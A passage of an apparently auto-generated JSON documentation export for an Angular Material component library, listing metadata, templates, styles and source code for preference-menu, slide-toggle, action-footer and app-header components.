            "templateData": "<button mat-button\n        class=\"filter-title\"\n        (menuOpened)=\"focusActiveItem(menu)\"\n        [matMenuTriggerFor]=\"menu\"\n        #trigger=\"matMenuTrigger\"\n        [matMenuTriggerData]=\"{ preferences: preferences }\">\n  {{ (preferences | activePreference:activePreferenceId)?.name || placeholder }}\n  <small *ngIf=\"dirty\">(modified)</small>\n  <mat-icon class=\"filter-title-icon\">keyboard_arrow_down</mat-icon>\n  <mat-progress-spinner *ngIf=\"loadingIndicator\"\n                        [diameter]=\"16\"\n                        mode=\"indeterminate\"></mat-progress-spinner>\n</button>\n\n<mat-menu #menu=\"matMenu\"\n          class=\"sto-menu preference-manager-list\">\n  <ng-template matMenuContent>\n    <div mat-menu-item\n         (click)=\"selectPreference.emit(pref.id)\"\n         (keydown.enter)=\"selectPreference.emit(pref.id);trigger.closeMenu()\"\n         [disableRipple]=\"true\"\n         class=\"dense preference-manager-list-item\"\n         [class.edit]=\"editIndex === index\"\n         [class.selected]=\"activePreferenceId ? pref.id === activePreferenceId : pref.default\"\n         *ngFor=\"let pref of preferences; let index = index\">\n      <div class=\"preference-manager-list-item-title\">\n        <span *ngIf=\"editIndex !== index\">{{ pref.name }}\n          <small *ngIf=\"pref.default\">[default]</small>\n        </span>\n        <mat-form-field *ngIf=\"editIndex === index\"\n                        (click)=\"$event.stopPropagation()\"\n                        (keydown)=\"$event.stopPropagation()\"\n                        (keydown.enter)=\"saveRename()\"\n                        (keydown.escape)=\"trigger.closeMenu()\"\n                        class=\"sto-form__field\"\n                        floatLabel=\"never\">\n          <input matInput\n                 autocomplete=\"off\"\n                 (focus)=\"nameTmpl.select()\"\n                 [value]=\"pref.name\"\n                 name=\"name\"\n                 #nameTmpl>\n        </mat-form-field>\n      </div>\n      <div class=\"preference-manager-list-item-actions\">\n        <button *ngIf=\"editIndex === index\"\n                title=\"Save new name\"\n                (click)=\"$event.stopPropagation(); saveRename()\"\n                mat-icon-button>\n          <mat-icon>save</mat-icon>\n        </button>\n        <button *ngIf=\"editIndex === index\"\n                title=\"Cancel rename\"\n                (click)=\"$event.stopPropagation(); cancelRename()\"\n                mat-icon-button>\n          <mat-icon>close</mat-icon>\n        </button>\n        <button (click)=\"$event.stopPropagation(); overwrite(pref)\"\n                title=\"Overwrite with current values\"\n                *ngIf=\"pref.external || (!editIndex && editIndex !== 0 && dirty && (activePreferenceId ? pref.id === activePreferenceId : pref.default))\"\n                mat-icon-button>\n          <mat-icon>save</mat-icon>\n        </button>\n        <button (click)=\"$event.stopPropagation();\"\n                *ngIf=\"!editIndex && editIndex !== 0\"\n                #moreTrigger=\"matMenuTrigger\"\n                [matMenuTriggerFor]=\"more\"\n                [matMenuTriggerData]=\"{preference: pref, trigger: moreTrigger}\"\n                mat-icon-button>\n          <mat-icon>more_vert</mat-icon>\n        </button>\n      </div>\n    </div>\n    <div mat-menu-item\n         [disableRipple]=\"true\"\n         *ngIf=\"newPreference\"\n         class=\"dense preference-manager-list-item edit\">\n      <div class=\"preference-manager-list-item-title\">\n        <mat-form-field (click)=\"$event.stopPropagation()\"\n                        (keydown)=\"$event.stopPropagation()\"\n                        (keydown.enter)=\"saveNewPreference()\"\n                        (keydown.escape)=\"trigger.closeMenu()\"\n                        class=\"sto-form__field\"\n                        floatLabel=\"never\">\n          <input matInput\n                 autocomplete=\"off\"\n                 (focus)=\"nameTmpl.select()\"\n                 [value]=\"newPreference.name\"\n                 name=\"name\"\n                 #nameTmpl>\n        </mat-form-field>\n      </div>\n      <div class=\"preference-manager-list-item-actions\">\n        <button (click)=\"$event.stopPropagation(); saveNewPreference()\"\n                mat-icon-button>\n          <mat-icon>save</mat-icon>\n        </button>\n        <button (click)=\"$event.stopPropagation(); cancelNewPreference()\"\n                mat-icon-button>\n          <mat-icon>close</mat-icon>\n        </button>\n      </div>\n    </div>\n    <div class=\"preference-manager-list-footer\"\n         (click)=\"$event.stopPropagation(); $event.preventDefault();\">\n      <button mat-stroked-button\n              (click)=\"addPreference()\"\n              color=\"primary\">New variant\n      </button>\n    </div>\n  </ng-template>\n</mat-menu>\n<mat-menu #more=\"matMenu\">\n  <ng-template matMenuContent\n               let-trigger=\"trigger\"\n               let-preference=\"preference\">\n    <button class=\"dense\"\n            (click)=\"$event.stopPropagation(); trigger.closeMenu(); toggleDefault(preference)\"\n            mat-menu-item>Set as default\n    </button>\n    <button class=\"dense\"\n            mat-menu-item\n            (click)=\"$event.stopPropagation(); trigger.closeMenu(); renamePreference(preference)\">Rename\n    </button>\n    <button class=\"dense\"\n            (click)=\"$event.stopPropagation(); trigger.closeMenu(); deletePreference.emit(preference.id)\"\n            mat-menu-item>Delete\n    </button>\n    <button class=\"dense\"\n            (click)=\"$event.stopPropagation(); trigger.closeMenu(); sharePreference.emit(preference.id)\"\n            mat-menu-item>Share\n    </button>\n  </ng-template>\n</mat-menu>\n\n"
        },
        {
            "name": "SlideToggleComponent",
            "id": "component-SlideToggleComponent-9c4b9cbfa7c9a3b9c4b8600a14554339",
            "file": "libs/form/src/lib/slide-toggle/slide-toggle.component.ts",
            "changeDetection": "ChangeDetectionStrategy.OnPush",
            "encapsulation": [
                "ViewEncapsulation.None"
            ],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [
                {
                    "name": "{ provide: MatFormFieldControl, useExisting: SlideToggleComponent }",
                    "type": "component"
                }
            ],
            "selector": "sto-slide-toggle",
            "styleUrls": [
                "./slide-toggle.component.scss"
            ],
            "styles": [],
            "templateUrl": [
                "./slide-toggle.component.html"
            ],
            "viewProviders": [],
            "inputsClass": [
                {
                    "name": "color",
                    "line": 79,
                    "type": "ThemePalette"
                },
                {
                    "name": "disabled",
                    "line": 67,
                    "type": "boolean"
                },
                {
                    "name": "readonly",
                    "line": 93,
                    "type": "boolean"
                },
                {
                    "name": "required",
                    "line": 114
                },
                {
                    "name": "value",
                    "line": 126
                }
            ],
            "outputsClass": [],
            "propertiesClass": [
                {
                    "name": "_color",
                    "type": "ThemePalette",
                    "optional": false,
                    "description": "",
                    "line": 88,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "_disabled",
                    "defaultValue": "false",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 64,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "_errorState",
                    "type": "boolean",
                    "optional": false,
                    "description": "",
                    "line": 62,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "_readonly",
                    "defaultValue": "false",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 90,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "_required",
                    "defaultValue": "false",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 111,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "_value",
                    "type": "boolean | null",
                    "optional": false,
                    "description": "",
                    "line": 123,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "autofilled",
                    "type": "boolean",
                    "optional": false,
                    "description": "",
                    "line": 37
                },
                {
                    "name": "controlType",
                    "defaultValue": "'number-input'",
                    "type": "string",
                    "optional": false,
                    "description": "",
                    "line": 38
                },
                {
                    "name": "ctrl",
                    "defaultValue": "new FormControl()",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 39
                },
                {
                    "name": "focused",
                    "type": "boolean",
                    "optional": false,
                    "description": "",
                    "line": 36
                },
                {
                    "name": "nextId",
                    "defaultValue": "0",
                    "type": "number",
                    "optional": false,
                    "description": "",
                    "line": 34,
                    "modifierKind": [
                        115
                    ]
                },
                {
                    "name": "ngControl",
                    "type": "NgControl",
                    "optional": false,
                    "description": "",
                    "line": 136,
                    "decorators": [
                        {
                            "name": "Optional",
                            "stringifiedArguments": ""
                        },
                        {
                            "name": "Self",
                            "stringifiedArguments": ""
                        }
                    ],
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "onChange",
                    "defaultValue": "() => {...}",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 178
                },
                {
                    "name": "onTouched",
                    "defaultValue": "() => {...}",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 181
                },
                {
                    "name": "placeholder",
                    "type": "string",
                    "optional": false,
                    "description": "",
                    "line": 109
                },
                {
                    "name": "slideToggle",
                    "type": "MatSlideToggle",
                    "optional": false,
                    "description": "",
                    "line": 46,
                    "decorators": [
                        {
                            "name": "ViewChild",
                            "stringifiedArguments": "MatSlideToggle"
                        }
                    ]
                },
                {
                    "name": "stateChanges",
                    "defaultValue": "new Subject<void>()",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 35
                },
                {
                    "name": "sub",
                    "defaultValue": "new Subscription()",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 40,
                    "modifierKind": [
                        114
                    ]
                }
            ],
            "methodsClass": [
                {
                    "name": "ngOnDestroy",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 160
                },
                {
                    "name": "ngOnInit",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 148
                },
                {
                    "name": "onContainerClick",
                    "args": [
                        {
                            "name": "event",
                            "type": "MouseEvent"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 166,
                    "jsdoctags": [
                        {
                            "name": "event",
                            "type": "MouseEvent",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "registerOnChange",
                    "args": [
                        {
                            "name": "fn",
                            "type": "never"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 188,
                    "jsdoctags": [
                        {
                            "name": "fn",
                            "type": "never",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "registerOnTouched",
                    "args": [
                        {
                            "name": "fn",
                            "type": "never"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 192,
                    "jsdoctags": [
                        {
                            "name": "fn",
                            "type": "never",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "setDescribedByIds",
                    "args": [
                        {
                            "name": "ids",
                            "type": "string[]"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 173,
                    "jsdoctags": [
                        {
                            "name": "ids",
                            "type": "string[]",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "setDisabledState",
                    "args": [
                        {
                            "name": "isDisabled",
                            "type": "boolean"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 196,
                    "jsdoctags": [
                        {
                            "name": "isDisabled",
                            "type": "boolean",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "writeValue",
                    "args": [
                        {
                            "name": "value",
                            "type": "boolean"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 184,
                    "jsdoctags": [
                        {
                            "name": "value",
                            "type": "boolean",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "hostBindings": [
                {
                    "name": "attr.aria-describedby",
                    "defaultValue": "''",
                    "line": 44
                },
                {
                    "name": "class.floating",
                    "line": 49
                },
                {
                    "name": "id",
                    "defaultValue": "`value-unit-input-${SlideToggleComponent.nextId++}`",
                    "line": 42
                }
            ],
            "hostListeners": [],
            "description": "",
            "rawdescription": "",
            "type": "component",
            "sourceCode": "import {\n  ChangeDetectionStrategy,\n  Component,\n  ElementRef,\n  HostBinding,\n  Input,\n  OnDestroy,\n  OnInit,\n  Optional,\n  Self,\n  ViewChild,\n  ViewEncapsulation\n} from '@angular/core';\nimport { ControlValueAccessor, FormControl, NgControl } from '@angular/forms';\nimport { MatFormFieldControl } from '@angular/material/form-field';\nimport { FocusMonitor } from '@angular/cdk/a11y';\nimport { Subject, Subscription } from 'rxjs';\nimport { coerceBooleanProperty } from '@angular/cdk/coercion';\nimport { ThemePalette } from '@angular/material/core';\nimport { MatSlideToggle } from '@angular/material/slide-toggle';\n\n@Component({\n  selector: 'sto-slide-toggle',\n  templateUrl: './slide-toggle.component.html',\n  styleUrls: [ './slide-toggle.component.scss' ],\n  encapsulation: ViewEncapsulation.None,\n  changeDetection: ChangeDetectionStrategy.OnPush,\n  providers: [\n    { provide: MatFormFieldControl, useExisting: SlideToggleComponent }\n  ]\n})\nexport class SlideToggleComponent implements OnInit, OnDestroy, ControlValueAccessor, MatFormFieldControl<boolean> {\n  static nextId = 0;\n  stateChanges = new Subject<void>();\n  focused: boolean;\n  autofilled: boolean;\n  controlType = 'number-input';\n  ctrl = new FormControl();\n  public sub = new Subscription();\n  @HostBinding()\n  id = `value-unit-input-${SlideToggleComponent.nextId++}`;\n  @HostBinding('attr.aria-describedby')\n  describedBy = '';\n  @ViewChild(MatSlideToggle)\n  slideToggle: MatSlideToggle;\n\n  @HostBinding('class.floating')\n  get shouldLabelFloat() {\n    return this.focused || !this.empty;\n  }\n\n  get errorState() {\n    return this._errorState;\n  }\n\n  set errorState(errorState) {\n    this._errorState = errorState;\n    this.stateChanges.next();\n  }\n\n  private _errorState: boolean;\n\n  private _disabled = false;\n\n  @Input()\n  get disabled(): boolean {\n    return this._disabled;\n  }\n\n  set disabled(value: boolean) {\n    this._disabled = coerceBooleanProperty(value);\n    const opts = { onlySelf: true, emitEvent: false };\n    this._disabled ? this.ctrl.disable(opts) : this.ctrl.enable(opts);\n    this.stateChanges.next();\n  }\n\n  @Input()\n  get color(): ThemePalette {\n    return this._color || 'primary';\n  }\n\n  set color(color) {\n    this._color = color || 'primary';\n    this.stateChanges.next();\n  }\n\n  private _color: ThemePalette;\n\n  private _readonly = false;\n\n  @Input()\n  get readonly(): boolean {\n    return this._readonly;\n  }\n\n  set readonly(value: boolean) {\n    this._readonly = coerceBooleanProperty(value);\n    const opts = { onlySelf: true, emitEvent: false };\n    value ? this.ctrl.disable(opts) : this.ctrl.enable(opts);\n    this.stateChanges.next();\n  }\n\n  get empty() {\n    const value = this.ctrl.value;\n    return !( value && value !== 0 );\n  }\n\n  placeholder: string; // Required by material control, but not used.\n\n  private _required = false;\n\n  @Input()\n  get required() {\n    return this._required;\n  }\n\n  set required(req) {\n    this._required = coerceBooleanProperty(req);\n    this.stateChanges.next();\n  }\n\n  private _value: boolean | null;\n\n  @Input()\n  get value() {\n    return this._value;\n  }\n\n  set value(value) {\n    this._value = value;\n    this.ctrl.setValue(value, { emitEvent: false });\n    this.stateChanges.next();\n  }\n\n  constructor(@Optional() @Self() public ngControl: NgControl,\n              private fm: FocusMonitor,\n              private elRef: ElementRef<HTMLElement>) {\n    if ( this.ngControl != null ) {\n      this.ngControl.valueAccessor = this;\n    }\n    fm.monitor(elRef.nativeElement, true).subscribe(origin => {\n      this.focused = !!origin;\n      this.stateChanges.next();\n    });\n  }\n\n  ngOnInit(): void {\n    const sub = this.ctrl.valueChanges\n      .subscribe((value: boolean) => {\n        this.onChange(value);\n      });\n    this.sub.add(sub);\n    if ( this.ngControl && this.ngControl.statusChanges ) {\n      this.sub.add(this.ngControl.statusChanges\n        .subscribe(state => this.errorState = state === 'INVALID'));\n    }\n  }\n\n  ngOnDestroy(): void {\n    this.stateChanges.complete();\n    this.fm.stopMonitoring(this.elRef.nativeElement);\n    this.sub.unsubscribe();\n  }\n\n  onContainerClick(event: MouseEvent): void {\n    if ( !this.disabled && !this.readonly ) {\n      this.slideToggle.focus();\n      this.ctrl.setValue(!this.ctrl.value);\n    }\n  }\n\n  setDescribedByIds(ids: string[]): void {\n    this.describedBy = ids.join(' ');\n  }\n\n  // eslint-disable-next-line @typescript-eslint/no-empty-function\n  onChange = (_: unknown) => {\n  }\n  // eslint-disable-next-line @typescript-eslint/no-empty-function\n  onTouched = () => {\n  }\n\n  writeValue(value: boolean): void {\n    this.value = value;\n  }\n\n  registerOnChange(fn: never): void {\n    this.onChange = fn;\n  }\n\n  registerOnTouched(fn: never): void {\n    this.onTouched = fn;\n  }\n\n  setDisabledState(isDisabled: boolean): void {\n    this.disabled = isDisabled;\n  }\n\n\n}\n",
            "assetsDirs": [],
            "styleUrlsData": [
                {
                    "data": ".sto-slide-toggle {\n  display: grid;\n  grid-template-columns: 1fr min-content;\n\n  .sto-slide-toggle__toggler {\n    position: absolute;\n    top: -6px;\n    right: 4px;\n\n    &--hide {\n      display: none;\n    }\n  }\n}\n",
                    "styleUrl": "./slide-toggle.component.scss"
                }
            ],
            "stylesData": "",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "ngControl",
                        "type": "NgControl"
                    },
                    {
                        "name": "fm",
                        "type": "FocusMonitor"
                    },
                    {
                        "name": "elRef",
                        "type": "ElementRef<HTMLElement>"
                    }
                ],
                "line": 134,
                "jsdoctags": [
                    {
                        "name": "ngControl",
                        "type": "NgControl",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "fm",
                        "type": "FocusMonitor",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "elRef",
                        "type": "ElementRef<HTMLElement>",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "implements": [
                "OnInit",
                "OnDestroy",
                "ControlValueAccessor",
                "MatFormFieldControl"
            ],
            "accessors": {
                "errorState": {
                    "name": "errorState",
                    "setSignature": {
                        "name": "errorState",
                        "type": "void",
                        "args": [
                            {
                                "name": "errorState",
                                "type": ""
                            }
                        ],
                        "returnType": "void",
                        "line": 57,
                        "jsdoctags": [
                            {
                                "name": "errorState",
                                "type": "",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    },
                    "getSignature": {
                        "name": "errorState",
                        "type": "",
                        "returnType": "",
                        "line": 53
                    }
                },
                "disabled": {
                    "name": "disabled",
                    "setSignature": {
                        "name": "disabled",
                        "type": "void",
                        "args": [
                            {
                                "name": "value",
                                "type": "boolean"
                            }
                        ],
                        "returnType": "void",
                        "line": 71,
                        "jsdoctags": [
                            {
                                "name": "value",
                                "type": "boolean",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    }
                },
                "color": {
                    "name": "color",
                    "setSignature": {
                        "name": "color",
                        "type": "void",
                        "args": [
                            {
                                "name": "color",
                                "type": ""
                            }
                        ],
                        "returnType": "void",
                        "line": 83,
                        "jsdoctags": [
                            {
                                "name": "color",
                                "type": "",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    }
                },
                "readonly": {
                    "name": "readonly",
                    "setSignature": {
                        "name": "readonly",
                        "type": "void",
                        "args": [
                            {
                                "name": "value",
                                "type": "boolean"
                            }
                        ],
                        "returnType": "void",
                        "line": 97,
                        "jsdoctags": [
                            {
                                "name": "value",
                                "type": "boolean",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    }
                },
                "empty": {
                    "name": "empty",
                    "getSignature": {
                        "name": "empty",
                        "type": "",
                        "returnType": "",
                        "line": 104
                    }
                },
                "required": {
                    "name": "required",
                    "setSignature": {
                        "name": "required",
                        "type": "void",
                        "args": [
                            {
                                "name": "req",
                                "type": ""
                            }
                        ],
                        "returnType": "void",
                        "line": 118,
                        "jsdoctags": [
                            {
                                "name": "req",
                                "type": "",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    }
                },
                "value": {
                    "name": "value",
                    "setSignature": {
                        "name": "value",
                        "type": "void",
                        "args": [
                            {
                                "name": "value",
                                "type": ""
                            }
                        ],
                        "returnType": "void",
                        "line": 130,
                        "jsdoctags": [
                            {
                                "name": "value",
                                "type": "",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    }
                }
            },
            "templateData": "<div class=\"sto-slide-toggle\">\n  <span class=\"sto-slide-toggle__label\">{{ ctrl.value ? 'Yes' : 'No' }}</span>\n  <mat-slide-toggle (click)=\"$event.stopPropagation()\"\n                    class=\"sto-slide-toggle__toggler\"\n                    [class.sto-slide-toggle__toggler--hide]=\"readonly\"\n                    [formControl]=\"ctrl\"\n                    [color]=\"color\"></mat-slide-toggle>\n</div>\n"
        },
        {
            "name": "StoActionFooterComponent",
            "id": "component-StoActionFooterComponent-76238f2566072fcc71a01189c0d6b6d3",
            "file": "libs/common/src/lib/sto-action-footer/sto-action-footer.component.ts",
            "changeDetection": "ChangeDetectionStrategy.OnPush",
            "encapsulation": [
                "ViewEncapsulation.None"
            ],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "sto-action-footer",
            "styleUrls": [
                "./sto-action-footer.component.scss"
            ],
            "styles": [],
            "templateUrl": [
                "./sto-action-footer.component.html"
            ],
            "viewProviders": [],
            "inputsClass": [
                {
                    "name": "isLoading",
                    "description": "<p>Triggers if the progressbar should be visible or not.</p>\n",
                    "line": 22,
                    "type": "boolean"
                },
                {
                    "name": "position",
                    "defaultValue": "'fixed'",
                    "description": "<p>Hostbinds to style.position. Defaults to &quot;fixed&quot;, but could be absolute inside a relative container.</p>\n",
                    "line": 33
                },
                {
                    "name": "shouldAddClass",
                    "defaultValue": "true",
                    "description": "<p>If a class &quot;sto-has-action-footer&quot; should be appended to the body-tag.\nThis is used to calculate correct height by adding padding to the body element as the footer is a fixed element.\nDefault true.</p>\n",
                    "line": 28
                }
            ],
            "outputsClass": [],
            "propertiesClass": [],
            "methodsClass": [
                {
                    "name": "ngOnDestroy",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 38
                },
                {
                    "name": "ngOnInit",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 44
                }
            ],
            "hostBindings": [
                {
                    "name": "class.sto-action-footer",
                    "defaultValue": "true",
                    "line": 17
                }
            ],
            "hostListeners": [],
            "description": "<p>The action footer is a fixed footer at the bottom of the viewport.\nShould be used with buttons with actions like &quot;Save, cancel etc.\nHas a built-in loading/progress bar.</p>\n",
            "rawdescription": "The action footer is a fixed footer at the bottom of the viewport.\nShould be used with buttons with actions like \"Save, cancel etc.\nHas a built-in loading/progress bar.",
            "type": "component",
            "sourceCode": "import { ChangeDetectionStrategy, Component, HostBinding, Input, OnDestroy, OnInit, Renderer2, ViewEncapsulation } from '@angular/core';\n\n/**\n * The action footer is a fixed footer at the bottom of the viewport.\n * Should be used with buttons with actions like \"Save, cancel etc.\n * Has a built-in loading/progress bar.\n */\n@Component({\n  selector: 'sto-action-footer',\n  templateUrl: './sto-action-footer.component.html',\n  styleUrls : ['./sto-action-footer.component.scss'],\n  encapsulation: ViewEncapsulation.None,\n  changeDetection: ChangeDetectionStrategy.OnPush\n})\nexport class StoActionFooterComponent implements OnInit, OnDestroy  {\n  @HostBinding('class.sto-action-footer')\n  private actionFooterClass = true;\n\n  /**\n   * Triggers if the progressbar should be visible or not.\n   */\n  @Input() isLoading: boolean;\n  /**\n   * If a class \"sto-has-action-footer\" should be appended to the body-tag.\n   * This is used to calculate correct height by adding padding to the body element as the footer is a fixed element.\n   * Default true.\n   */\n  @Input() shouldAddClass = true;\n\n  /**\n   * Hostbinds to style.position. Defaults to \"fixed\", but could be absolute inside a relative container.\n   */\n  @HostBinding('style.position') @Input() position = 'fixed';\n\n  constructor(private renderer: Renderer2) {\n  }\n\n  ngOnDestroy(): void {\n    if ( this.shouldAddClass ) {\n      this.renderer.removeClass(document.body, 'sto-has-action-footer');\n    }\n  }\n\n  ngOnInit(): void {\n    if ( this.shouldAddClass ) {\n      this.renderer.addClass(document.body, 'sto-has-action-footer');\n    }\n  }\n\n}\n",
            "assetsDirs": [],
            "styleUrlsData": [
                {
                    "data": "@use '~@angular/material' as mat;\n\n$footer-height: 69px;\n\n.sto-action-footer {\n  @include mat.elevation(4);\n\n  bottom: 0;\n  left: 0;\n  width: 100%;\n  height: $footer-height;\n  min-height: $footer-height;\n  z-index: 25;\n\n  button {\n    text-transform: uppercase;\n  }\n\n  &__message {\n    line-height: 2.9;\n  }\n\n  &__content {\n    padding: 16px 24px;\n  }\n\n  .mat-progress-bar {\n    margin-top: -5px;\n  }\n\n}\n\n.sto-has-action-footer{\n  padding-bottom: $footer-height;\n}\n\n",
                    "styleUrl": "./sto-action-footer.component.scss"
                }
            ],
            "stylesData": "",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "renderer",
                        "type": "Renderer2"
                    }
                ],
                "line": 33,
                "jsdoctags": [
                    {
                        "name": "renderer",
                        "type": "Renderer2",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "implements": [
                "OnInit",
                "OnDestroy"
            ],
            "readme": "<h4 id=\"sto-action-footer\">Sto action footer</h4>\n<p>The action footer is a fixed footer at the bottom of the viewport.\nShould be used with buttons with actions like &quot;Save, cancel etc.\nHas a built-in loading/progress bar.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-action-footer [isLoading]=&quot;$isloading | async&quot;&gt;\n    &lt;button (click)=&quot;onClick()&quot;&gt;Submit&lt;/button&gt;\n    &lt;button (click)=&quot;cancel()&quot;&gt;Cancel&lt;/button&gt;\n&lt;/sto-action-footer&gt;</code></pre></div><h5 id=\"isloading\">isLoading</h5>\n<p>Triggers if the progressbar should be visible or not.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-action-footer [isLoading]=&quot;true&quot;&gt;&lt;/sto-action-footer&gt; </code></pre></div><h5 id=\"shouldaddclass\">shouldAddClass</h5>\n<p>If a class &quot;sto-has-action-footer&quot; should be appended to the body-tag.<br>This is used to calculate correct height by adding padding to the body element as the footer is a fixed element.<br>Default true.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-action-footer [shouldAddClass]=&quot;false&quot;&gt;&lt;/sto-action-footer&gt; </code></pre></div><h5 id=\"position\">position</h5>\n<p>Hostbinds to style.position. Defaults to &quot;fixed&quot;, but could be absolute inside a relative container.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-action-footer position=&quot;absolute&quot; [shouldAddClass]=&quot;false&quot;&gt;&lt;/sto-action-footer&gt; </code></pre></div>",
            "templateData": "<mat-progress-bar\n\t\t*ngIf=\"isLoading\"\n\t\tcolor=\"primary\"\n\t\tmode=\"indeterminate\"\n\n></mat-progress-bar>\n<div class=\"sto-action-footer__content\">\n\t<ng-content></ng-content>\n</div>\n"
        },
        {
            "name": "StoAppHeaderComponent",
            "id": "component-StoAppHeaderComponent-8791495ef2e465dfc16f8c60cf74c5f5",
            "file": "libs/common/src/lib/sto-app-header/sto-app-header.component.ts",
            "changeDetection": "ChangeDetectionStrategy.OnPush",
            "encapsulation": [
                "ViewEncapsulation.None"
            ],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "sto-app-header",
            "styleUrls": [
                "./sto-app-header.component.scss"
            ],
            "styles": [],
            "templateUrl": [
                "./sto-app-header.component.html"
            ],
            "viewProviders": [],
            "inputsClass": [
                {
                    "name": "breadCrumbs",
                    "description": "<p>Configuration used to print out the relevant application breadcrumbs.</p>\n",
                    "line": 51,
                    "type": "Breadcrumb[]"
                },
                {
                    "name": "environmentName",
                    "description": "<p>If {@link testEnvironment} is true, this name is printed out centered on the header</p>\n",
                    "line": 36,
                    "type": "string"
                },
                {
                    "name": "homeBreadCrumbConfig",
                    "description": "<p>Configuration that determines what to do when clicking the top-level menu icon</p>\n",
                    "line": 46,
                    "type": "literal type"
                },
                {
                    "name": "testEnvironment",
                    "description": "<p>testEnvironment tells the header whether or not to style itself defining a test-environment</p>\n",
                    "line": 31,
                    "type": "boolean"
                },
                {
                    "name": "userMenu",
                    "description": "<p>Input for user information menu.</p>\n",
                    "line": 41,
                    "type": "MatMenuPanel"
                }
            ],
            "outputsClass": [],
            "propertiesClass": [
                {
                    "name": "darkmode$",
                    "type": "Observable<boolean>",
                    "optional": false,
                    "description": "",
                    "line": 53,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "isSmall$",
                    "type": "Observable<boolean>",
                    "optional": false,
                    "description": "",
                    "line": 54,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "menuOpen",
                    "type": "boolean",
                    "optional": false,
                    "description": "",
                    "line": 55,
                    "modifierKind": [
                        114
                    ]
                }
            ],
            "methodsClass": [
                {
                    "name": "ngOnInit",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 107
                },
                {
                    "name": "toggleMenu",
                    "args": [
                        {
                            "name": "event",
                            "type": "MouseEvent"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 76,
                    "jsdoctags": [
                        {
                            "name": "event",
                            "type": "MouseEvent",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "toggleTheme",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 64
                },
                {
                    "name": "toggleTypography",
                    "args": [
                        {
                            "name": "className",
                            "type": "string",
                            "optional": true
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 69,
                    "jsdoctags": [
                        {
                            "name": "className",
                            "type": "string",
                            "optional": true,
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "hostBindings": [],
            "hostListeners": [],
            "description": "<p>StoAppHeaderComponent is used to create an App header toolbar with a common look / feel across our portfolio</p>\n",
            "rawdescription": "StoAppHeaderComponent is used to create an App header toolbar with a common look / feel across our portfolio",
            "type": "component",
